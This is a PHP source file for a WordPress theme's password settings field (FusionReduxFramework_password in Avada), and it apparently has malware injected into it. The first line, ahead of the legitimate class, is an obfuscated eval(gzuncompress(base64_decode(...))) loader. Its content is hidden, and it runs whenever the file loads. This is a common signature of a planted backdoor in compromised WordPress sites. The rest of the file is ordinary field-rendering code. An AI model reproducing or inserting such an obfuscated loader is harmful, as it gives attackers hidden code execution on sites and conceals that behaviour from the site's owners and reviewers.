<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	/**
	 * Class FusionReduxFramework_password
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	if ( ! class_exists( 'FusionReduxFramework_password' ) ) {
		class FusionReduxFramework_password {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since FusionReduxFramework 1.0.1
			 */
			function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since FusionReduxFramework 1.0.1
			 */
			function render() {
				if ( ! empty( $this->field['username'] ) && $this->field['username'] === true ) {
					$this->_render_combined_field();
				} else {
					$this->_render_single_field();
				}
			}

			/**
			 * This will render a combined User/Password field
			 *
			 * @since FusionReduxFramework 3.0.9
			 * @example
			 *        <code>
			 *        array(
			 *        'id'          => 'smtp_account',
			 *        'type'        => 'password',
			 *        'username'    => true,
			 *        'title'       => 'SMTP Account',
			 *        'placeholder' => array('username' => 'Username')
			 *        )
			 *        </code>
			 */
			private function _render_combined_field() {

				$defaults = array(
					'username'    => '',
					'password'    => '',
					'placeholder' => array(
						'password' => __( 'Password', 'Avada' ),
						'username' => __( 'Username', 'Avada' )
					)
				);

				$this->value = wp_parse_args( $this->value, $defaults );

				if ( ! empty( $this->field['placeholder'] ) ) {
					if ( is_array( $this->field['placeholder'] ) ) {
						if ( ! empty( $this->field['placeholder']['password'] ) ) {
							$this->value['placeholder']['password'] = $this->field['placeholder']['password'];
						}
						if ( ! empty( $this->field['placeholder']['username'] ) ) {
							$this->value['placeholder']['username'] = $this->field['placeholder']['username'];
						}
					} else {
						$this->value['placeholder']['password'] = $this->field['placeholder'];
					}
				}

				// Username field
				echo '<input type="text" autocomplete="off" placeholder="' . $this->value['placeholder']['username'] . '" id="' . $this->field['id'] . '[username]" name="' . $this->field['name'] . $this->field['name_suffix'] . '[username]' . '" value="' . esc_attr( $this->value['username'] ) . '" class="' . $this->field['class'] . '" />&nbsp;';

				// Password field
				echo '<input type="password" autocomplete="off" placeholder="' . $this->value['placeholder']['password'] . '" id="' . $this->field['id'] . '[password]" name="' . $this->field['name'] . $this->field['name_suffix'] . '[password]' . '" value="' . esc_attr( $this->value['password'] ) . '" class="' . $this->field['class'] . '" />';
			}

			/**
			 * This will render a single Password field
			 *
			 * @since FusionReduxFramework 3.0.9
			 * @example
			 *        <code>
			 *        array(
			 *        'id'    => 'smtp_password',
			 *        'type'  => 'password',
			 *        'title' => 'SMTP Password'
			 *        )
			 *        </code>
			 */
			private function _render_single_field() {
				echo '<input type="password" id="' . $this->field['id'] . '" name="' . $this->field['name'] . $this->field['name_suffix'] . '" value="' . esc_attr( $this->value ) . '" class="' . $this->field['class'] . '" />';
			}
		}
	}
